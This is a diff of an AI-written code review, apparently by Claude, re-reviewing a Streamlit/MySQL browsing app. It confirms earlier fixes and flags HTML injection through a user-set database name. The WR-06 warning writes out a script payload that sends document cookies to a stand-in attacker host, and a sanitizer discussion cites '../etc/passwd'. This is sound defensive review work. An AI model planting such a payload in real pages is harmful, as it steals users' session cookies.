@@ -1,8 +1,8 @@
 ---
 phase: 01-foundation-browsing
-reviewed: 2026-04-23T00:00:00Z
+reviewed: 2026-04-23T20:30:00Z
 depth: standard
-files_reviewed: 12
+files_reviewed: 7
 files_reviewed_list:
   - streamlit_app.py
   - app/adapters/db/mysql.py
@@ -11,269 +11,116 @@ files_reviewed_list:
   - app/pages/settings.py
   - app/pages/browse.py
   - app/components/export_dialog.py
-  - tests/services/test_result_normalizer.py
-  - tests/services/test_ufs_service.py
-  - .gitignore
-  - .streamlit/config.toml
-  - requirements.txt
 findings:
-  critical: 1
-  warning: 5
+  critical: 0
+  warning: 1
   info: 4
-  total: 10
+  total: 5
 status: issues_found
 ---
 
-# Phase 01: Code Review Report
+# Phase 01: Code Review Report (Re-review after 01-REVIEW-FIX iteration 1)
 
-**Reviewed:** 2026-04-23T00:00:00Z
+**Reviewed:** 2026-04-23T20:30:00Z
 **Depth:** standard
-**Files Reviewed:** 12
+**Files Reviewed:** 7
 **Status:** issues_found
 
 ## Summary
 
-Phase 1 delivers the foundation browsing layer: a MySQL EAV adapter, a result
-normalization pipeline, a UFS data service (catalog + cell fetch + pivot), a
-Browse page with three tabs, a Settings page, and an export dialog.
+Re-review of the Phase 1 foundation browsing layer following the code-review-fix
+pass that patched CR-01 and WR-01 through WR-05.
 
-The overall code quality is high. SQL injection risk is eliminated through
-`sa.bindparam(expanding=True)` on every user-supplied filter value, and
-`_TABLE` is a module constant never interpolated from user input. Auth is
-correctly deferred with no demo credentials anywhere in the code. The YAML
-settings path is protected by the `.gitignore` entry for `config/settings.yaml`
-and `config/auth.yaml`.
+**All six previously-blocking issues are confirmed resolved.** The patches are
+correct and no regressions were introduced by the fixes themselves.
 
-One critical issue was found: a raw f-string interpolation of `_TABLE` into
-SQL in `ufs_service.py` catalog queries that bypasses SQLAlchemy parameter
-binding for the table name. While `_TABLE` is currently a module constant
-(not user input), this is still a structural violation of the codebase's own
-security contract (T-03-01), and the pattern must not be generalised. Three
-warnings relate to cache-key correctness, a swallowed-exception path in
-`mysql.py`, and a pandas `pd.isna()` call inside `try_numeric` that will raise
-`TypeError` on a non-NA scalar. Four info-level items cover an unused import,
-a duplicated cache-resource factory, a path traversal gap in the sanitizer
-step ordering, and a missing test for the `_sanitize_filename` function.
+One new warning was found during the broader scan: the database name string is
+interpolated directly into a `markdown(..., unsafe_allow_html=True)` call in
+`streamlit_app.py`. Because `active_db` is sourced from settings (a user-
+controlled YAML file), a maliciously crafted DB name can inject arbitrary HTML
+into the sidebar. This was not visible in the previous review pass but is
+surfaced now as a direct consequence of reviewing the HTML context around the
+health indicator.
+
+The four info items from the original review are unchanged and are restated
+for completeness.
 
 ---
 
-## Critical Issues
+## Verification of Previously-Blocking Issues
 
-### CR-01: f-string table name interpolation in SQL strings (ufs_service.py)
-
-**File:** `app/services/ufs_service.py:57`, `71`, `132`, `150`
-
-**Issue:** `_TABLE` is interpolated with an f-string directly into `sa.text()`
-SQL strings in `list_platforms`, `list_parameters`, and both branches of
-`fetch_cells`. The module docstring claims "Never interpolated from user data"
-and the project threat model (T-03-01) requires all values in SQL to go
-through bind parameters. While `_TABLE` is currently a hard-coded module
-constant (`"ufs_data"`), the pattern directly contradicts the stated security
-contract: if `_TABLE` were ever sourced from settings, user input, or an env
-var, SQL injection would be trivially possible. The inconsistency is also
-confusing during audit — the code uses parameterised values for user-supplied
-filter lists but raw string formatting for the table name.
-
-**Fix:** Use a `sa.table()` / `sa.column()` construct or a validated allowlist
-lookup instead of f-string interpolation. The minimal safe change that keeps
-the current single-table architecture:
-
-```python
-# At module level — explicit allowlist
-_ALLOWED_TABLES = frozenset({"ufs_data"})
-
-def _safe_table(name: str) -> str:
-    if name not in _ALLOWED_TABLES:
-        raise ValueError(f"Table '{name}' is not in the allowed table list")
-    return name
-
-# In list_platforms:
-tbl = _safe_table(_TABLE)
-df = pd.read_sql_query(
-    sa.text(f"SELECT DISTINCT PLATFORM_ID FROM {tbl} ORDER BY PLATFORM_ID"),
-    conn,
-)
-```
-
-For a stricter fix that avoids f-strings entirely, use SQLAlchemy Core
-expression language:
-
-```python
-_ufs_table = sa.table(
-    "ufs_data",
-    sa.column("PLATFORM_ID"),
-    sa.column("InfoCategory"),
-    sa.column("Item"),
-    sa.column("Result"),
-)
-# list_platforms:
-stmt = sa.select(sa.func.distinct(_ufs_table.c.PLATFORM_ID)).order_by(_ufs_table.c.PLATFORM_ID)
-df = pd.read_sql_query(stmt, conn)
-```
+| ID | Finding | Status |
+|----|---------|--------|
+| CR-01 | `_safe_table()` called before every SQL f-string | **Fixed** — `tbl = _safe_table(_TABLE)` at lines 74, 92, 158; used at all four SQL sites (77, 96, 161, 179). |
+| WR-01 | `db_name` in all three `@st.cache_data` signatures | **Fixed** — `list_platforms` (line 66), `list_parameters` (line 84), `fetch_cells` (line 115) all have `db_name: str = ""`. All call sites in browse.py pass `db_name=db_name` or `db_name=adapter.config.name` (lines 154, 173, 243, 352, 412). |
+| WR-02 | `logger.debug` before swallow in `get_schema` | **Fixed** — `except Exception as exc:` with `logger.debug("get_pk_constraint failed for table %s: %s", t, exc)` at lines 60-61 of mysql.py. |
+| WR-03 | `try/except (TypeError, ValueError)` around `pd.isna` in `_coerce` | **Fixed** — lines 299-303 of result_normalizer.py mirror the safe pattern from `is_missing`. |
+| WR-04 | `_sanitize_filename` removes `/` and `\` before charset clamp | **Fixed** — line 52 of export_dialog.py: `name.replace("..", "").replace("/", "").replace("\\", "")`. The three replacements are independent of step order. |
+| WR-05 | Unconditional `browse.tab` writes in all three `with tab:` blocks | **Fixed** — no assignments to `browse.tab` remain inside the three `with` blocks. `browse.tab` is set only by `_load_state_from_url` (line 77) and is read via `session_state.get` at line 533. |
 
 ---
 
 ## Warnings
 
-### WR-01: Multi-DB cache collision — `_db` skipped in cache key (ufs_service.py)
+### WR-06: DB name injected into `unsafe_allow_html` markdown without escaping (streamlit_app.py)
 
-**File:** `app/services/ufs_service.py:23-26`, `48`, `63`, `85`
+**File:** `streamlit_app.py:134`
 
-**Issue:** All three `@st.cache_data` functions (`list_platforms`,
-`list_parameters`, `fetch_cells`) use `_db` with an underscore prefix, which
-tells Streamlit to skip hashing that argument. The module docstring explicitly
-acknowledges this as "T-03-04 / Pitfall-8" for `fetch_cells`, but the same
-problem exists for `list_platforms` and `list_parameters` and is not
-documented there. In the current single-DB deployment this is harmless, but
-the warning is warranted because the settings UI allows adding multiple
-databases and the sidebar shows a DB selector — a second session choosing a
-different DB would get cached catalog data from the first DB.
-
-**Fix:** Add an explicit `db_name: str` argument alongside `_db` to all three
-functions so the cache key includes the database identity:
+**Issue:** The health-indicator markdown renders `active_db` (the database name
+string) directly inside an f-string that is passed to
+`st.sidebar.markdown(..., unsafe_allow_html=True)`:
 
 ```python
-@st.cache_data(ttl=300, show_spinner=False)
-def list_platforms(_db: DBAdapter, db_name: str) -> list[str]:
-    ...
-
-# Call site in browse.py / ufs_service tests:
-list_platforms(adapter, db_name=active_db_name)
+st.sidebar.markdown(
+    f'<span style="color:{dot_color};">●</span> {active_db or "No DB"}',
+    unsafe_allow_html=True,
+)
 ```
 
-The `db_name` string is hashable, so `@st.cache_data` will include it in the
-key automatically. This is the same pattern recommended for Phase 2 in the
-module docstring — apply it now before the first multi-DB user hits the bug.
+`active_db` is read from `st.session_state["active_db"]`, which is populated
+from `settings.databases[i].name` — a string stored in `config/settings.yaml`
+and edited via the Settings page. Anyone with access to the Settings page (the
+entire intranet team per D-09) can set a database name to a string such as
+`<script>fetch('http://attacker/'+document.cookie)</script>` and cause that
+script to execute in every session that renders the sidebar, because
+`unsafe_allow_html=True` passes the raw string to the browser without
+sanitisation.
 
+`dot_color` is safe — it is a hardcoded literal selected by an if/elif/else
+chain with no user input — but `active_db` is not.
 
-### WR-02: Bare `except` swallows SQLAlchemy engine errors silently (mysql.py)
+**Fix:** Either (a) HTML-escape `active_db` before interpolation using Python's
+stdlib `html.escape`, or (b) switch to a safe rendering approach that does not
+require `unsafe_allow_html=True`:
 
-**File:** `app/adapters/db/mysql.py:58`
-
-**Issue:** In `get_schema`, the `except Exception: pk_cols = set()` block
-silently discards any exception from `inspector.get_pk_constraint(t)`. If
-SQLAlchemy raises a real connectivity error here (not just a missing PK
-constraint), the error is swallowed, the column list is returned without PK
-markings, and the caller has no way to distinguish "no PK" from "DB is down".
-The pattern is consistent within the method but is the kind of broad catch
-that hides operational problems.
-
-**Fix:** Narrow the catch to the specific exception type that `get_pk_constraint`
-raises for missing constraints (typically `sqlalchemy.exc.NoInspectionAvailable`
-or `NotImplementedError` depending on the backend), or at minimum log the
-exception before swallowing it:
-
+Option A — escape the user-controlled string (minimal change):
 ```python
-try:
-    pk_cols = set(inspector.get_pk_constraint(t).get("constrained_columns") or [])
-except Exception as exc:
-    logger.debug("get_pk_constraint failed for table %s: %s", t, exc)
-    pk_cols = set()
+import html as _html  # add to top-level imports
+
+st.sidebar.markdown(
+    f'<span style="color:{dot_color};">●</span> {_html.escape(active_db or "No DB")}',
+    unsafe_allow_html=True,
+)
 ```
 
-At the very least add a `logger.debug(...)` call so the exception appears in
-logs during DB troubleshooting.
-
-
-### WR-03: `pd.isna()` raises `TypeError` on scalar non-NA values in `try_numeric` (result_normalizer.py)
-
-**File:** `app/services/result_normalizer.py:299`
-
-**Issue:** Inside `_coerce` (the inner function of `try_numeric`), the first
-guard is `if pd.isna(val): return pd.NA`. For a plain Python `str` such as
-`"abc"`, `pd.isna("abc")` returns `False` — that is correct. However, for a
-non-scalar array-like value (e.g., a list or numpy array), `pd.isna()` returns
-an array rather than a scalar bool, which means the `if` statement silently
-evaluates to the truthiness of an array — a well-known pandas footgun that
-raises `ValueError: The truth value of an array is ambiguous` in pandas 3.x if
-the array is non-empty. The same guard pattern in `is_missing` (line 91)
-correctly wraps the `pd.isna` call in a `try/except (TypeError, ValueError)`,
-but `try_numeric` does not.
-
-**Fix:** Mirror the safe guard from `is_missing`:
-
+Option B — split into two calls so no raw HTML is needed for the label:
 ```python
-def _coerce(val: Any) -> Any:
-    try:
-        if pd.isna(val):
-            return pd.NA
-    except (TypeError, ValueError):
-        pass  # array-like — fall through to string coercion
-    s = str(val).strip()
-    ...
+st.sidebar.markdown(
+    f'<span style="color:{dot_color};">●</span>',
+    unsafe_allow_html=True,
+)
+st.sidebar.caption(active_db or "No DB")
 ```
 
-Alternatively, restrict the early-exit check to `None` and `pd.NA` explicitly:
-
-```python
-if val is None or val is pd.NA:
-    return pd.NA
-```
-
-
-### WR-04: `_sanitize_filename` step ordering: `".."` removal before charset clamp leaves `/` unhandled (export_dialog.py)
-
-**File:** `app/components/export_dialog.py:49-51`
-
-**Issue:** Step 2 removes `".."` occurrences, and Step 3 remaps characters
-outside `[A-Za-z0-9_-.]` to `"_"` — which would catch `/` and `\`. However,
-the step 2 comment says ".." is removed "before charset clamp so path
-separators and traversal sequences are eliminated before the allowed-set filter
-runs" — but the logic is reversed: the charset clamp (step 3) is what handles
-`/` and `\`, not step 2. A string like `"../etc/passwd"` becomes `".etcpasswd"`
-after step 2, then `".etcpasswd"` after step 3 (the `/` is already gone), then
-`"etcpasswd"` after the strip. The defence does work end-to-end, but step 2
-only removes `..` and leaves bare `/` present until step 3. The comment is
-misleading and a future edit that reorders steps 2 and 3 could break the
-traversal defence.
-
-**Fix:** Either add an explicit `/` and `\` removal step before the charset
-clamp (making the defence independent of step ordering), or update the comment
-to accurately describe the defence-in-depth layering:
-
-```python
-# Step 2a: Remove path separators explicitly (belt-and-suspenders before charset clamp)
-s = name.replace("..", "").replace("/", "").replace("\\", "")
-# Step 3: Remap any remaining character outside the allowed set to '_'
-s = re.sub(r"[^A-Za-z0-9_\-.]", "_", s)
-```
-
-
-### WR-05: `browse.tab` session state written unconditionally in all three `with tab:` blocks (browse.py)
-
-**File:** `app/pages/browse.py:530-542`
-
-**Issue:** The three `with pivot_tab:`, `with detail_tab:`, `with chart_tab:`
-blocks each unconditionally write `st.session_state["browse.tab"] = "Pivot"` /
-`"Detail"` / `"Chart"`. In Streamlit, all three `with tab:` blocks run on
-every rerun regardless of which tab the user is viewing. This means `browse.tab`
-is always set to `"Chart"` (the last block that executes), so
-`_sync_state_to_url` always writes `?tab=chart` to the URL regardless of the
-active tab — the round-trip URL feature is broken for Pivot and Detail tabs.
-
-**Fix:** The active-tab tracking should be driven by a widget key or Streamlit's
-tab selection mechanism, not by unconditional assignment in every block. The
-simplest correct approach for Streamlit is to track which tab triggered the
-current rerun via a `st.session_state` key set only on the tab-switch event,
-or to remove the tab sync entirely if it cannot be reliably tracked. If the
-tab `key` parameter is used (Streamlit 1.40+ supports `key` on `st.tabs`),
-that key can be read from session state.
-
-As a minimal fix, remove the three unconditional assignments and instead rely
-on the initial URL-loaded value from `_load_state_from_url`:
-
-```python
-# Remove these three lines:
-# st.session_state["browse.tab"] = "Pivot"   # line 530
-# st.session_state["browse.tab"] = "Detail"  # line 535
-# st.session_state["browse.tab"] = "Chart"   # line 539
-```
+Option B is preferred because it eliminates the `unsafe_allow_html` surface
+entirely for the label portion. Option A is acceptable if the single-line
+rendering is required for layout reasons.
 
 ---
 
 ## Info
 
-### IN-01: Duplicate `@st.cache_resource` factory — `_get_db_adapter` defined in both `streamlit_app.py` and `browse.py`
+### IN-01: Duplicate `@st.cache_resource` factory in `browse.py` and `streamlit_app.py`
 
 **File:** `app/pages/browse.py:37-50` and `streamlit_app.py:37-52`
 
@@ -281,15 +128,10 @@ on the initial URL-loaded value from `_load_state_from_url`:
 (`_get_db_adapter` in browse.py and `get_db_adapter` in streamlit_app.py)
 both exist. Streamlit caches `@st.cache_resource` per function object, so
 these two functions produce separate cache entries. The engine is constructed
-twice when both are called for the same `db_name`. This is not a correctness
-bug (both functions return equivalent adapters), but it wastes a DB connection
-and makes the codebase harder to maintain.
+twice when both are called for the same `db_name`.
 
 **Fix:** Extract the shared factory into a dedicated module (e.g.,
-`app/adapters/db/factory.py`) and import it in both files, or have `browse.py`
-import `get_db_adapter` from `streamlit_app.py` (though that creates a module
-dependency that may be uncomfortable). The cleanest resolution is a shared
-helper in the adapters package.
+`app/adapters/db/factory.py`) and import it in both files.
 
 
 ### IN-02: Unused import `build_llm_adapter` retained in `settings.py`
@@ -298,12 +140,11 @@ helper in the adapters package.
 
 **Issue:** `from app.adapters.llm.registry import build_adapter as build_llm_adapter`
 is imported but never used. The inline comment says "unused in Phase 1 Test
-helper; retained for Phase 2" — this is intentional scaffolding, but it will
-cause `ruff` lint warnings and can confuse readers about what is actually active.
+helper; retained for Phase 2" — intentional scaffolding, but it triggers `ruff`
+lint warnings.
 
-**Fix:** Either remove the import and re-add it in Phase 2, or suppress the
-lint warning explicitly:
-
+**Fix:** Add a `noqa` suppression if you want to keep it, or remove it and
+re-add in Phase 2:
 ```python
 from app.adapters.llm.registry import build_adapter as build_llm_adapter  # noqa: F401 — Phase 2
 ```
@@ -311,18 +152,16 @@ from app.adapters.llm.registry import build_adapter as build_llm_adapter  # noqa
 
 ### IN-03: No test for `_sanitize_filename` in export_dialog.py
 
-**File:** `app/components/export_dialog.py:30-59`
+**File:** `app/components/export_dialog.py:30-62`
 
 **Issue:** `_sanitize_filename` is a security-relevant function (path-traversal
 defence, T-07-01/02) with seven explicit rules and multiple edge cases. It has
-no corresponding unit test. Given the known risk of step-ordering bugs (see
-WR-04) and the safety importance of the function, a test covering at minimum
-`None`, `".."`, path traversal sequences, empty-after-strip, and the 128-char
-truncation is warranted.
+no corresponding unit test. Given the known risk of step-ordering bugs (WR-04,
+now fixed) and the safety importance of the function, a test covering `None`,
+`".."`, path traversal sequences, empty-after-strip, and the 128-char truncation
+is warranted.
 
-**Fix:** Add a test file `tests/components/test_export_dialog.py` with
-parametrized cases:
-
+**Fix:** Add `tests/components/test_export_dialog.py`:
 ```python
 import pytest
 from app.components.export_dialog import _sanitize_filename
@@ -336,34 +175,29 @@ from app.components.export_dialog import _sanitize_filename
     ("valid_name",       "valid_name"),
     ("a" * 200,          "a" * 128),
     ("..foo..",          "foo"),
+    ("foo/bar",          "foo_bar"),
+    ("foo\\bar",         "foo_bar"),
 ])
 def test_sanitize_filename(inp, expected):
     assert _sanitize_filename(inp) == expected
 ```
 
 
-### IN-04: `requirements.txt` pins `pandas>=3.0` without upper bound
+### IN-04: `requirements.txt` — `pandas>=3.0` without upper bound
 
-**File:** `requirements.txt:5`
+**File:** `requirements.txt`
 
 **Issue:** `pandas>=3.0` has no upper bound. A future `pandas>=4.0` release
-with breaking changes (string dtype API changes are already in motion in
-pandas' roadmap) could break the `pd.StringDtype` handling, `pd.NA` semantics,
-or the `pd.read_sql_query` signature without warning. The CLAUDE.md
-architecture table recommends targeting pandas 3.x idioms.
+with breaking changes could affect `pd.NA` semantics or `pd.read_sql_query`
+without warning.
 
-**Fix:** Add an upper-bound pin consistent with the tested version:
-
+**Fix:**
 ```
 pandas>=3.0,<4.0
 ```
 
-This is low urgency (pandas 4 does not exist yet) but is a good hygiene
-practice consistent with how `sqlalchemy`, `streamlit`, and `pydantic-ai` are
-already pinned.
-
 ---
 
-_Reviewed: 2026-04-23T00:00:00Z_
+_Reviewed: 2026-04-23T20:30:00Z_
 _Reviewer: Claude (gsd-code-reviewer)_
 _Depth: standard_
